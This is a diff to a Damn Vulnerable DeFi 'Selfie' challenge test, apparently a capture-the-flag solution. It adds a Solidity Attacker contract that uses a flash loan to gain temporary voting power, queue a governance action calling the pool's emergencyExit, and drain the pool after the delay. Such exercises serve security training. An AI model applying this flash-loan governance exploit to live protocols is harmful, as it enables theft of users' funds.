@@ -2,10 +2,43 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+
+contract Attacker is IERC3156FlashBorrower {
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+    SimpleGovernance private immutable governance;
+    SelfiePool private immutable pool;
+    address private immutable target;
+
+    constructor(SelfiePool _pool, SimpleGovernance _governance, address _target) {
+        pool = _pool;
+        governance = _governance;
+        target = _target;
+    }
+
+    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata)
+        external
+        returns (bytes32)
+    {
+        DamnValuableVotes(token).approve(msg.sender, amount + fee);
+        DamnValuableVotes(token).delegate(address(this));
+        governance.queueAction(address(pool), 0, abi.encodeCall(pool.emergencyExit, (target)));
+        return CALLBACK_SUCCESS;
+    }
+
+    function queueRecovery() external {
+        address token = address(pool.token());
+        pool.flashLoan(this, token, pool.maxFlashLoan(token), "");
+    }
+
+    function executeRecovery() external {
+        governance.executeAction({actionId: 1});
+    }
+}
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +95,10 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker(pool, governance, recovery);
+        attacker.queueRecovery();
+        vm.warp(block.timestamp + governance.getActionDelay());
+        attacker.executeRecovery();
     }
 
     /**
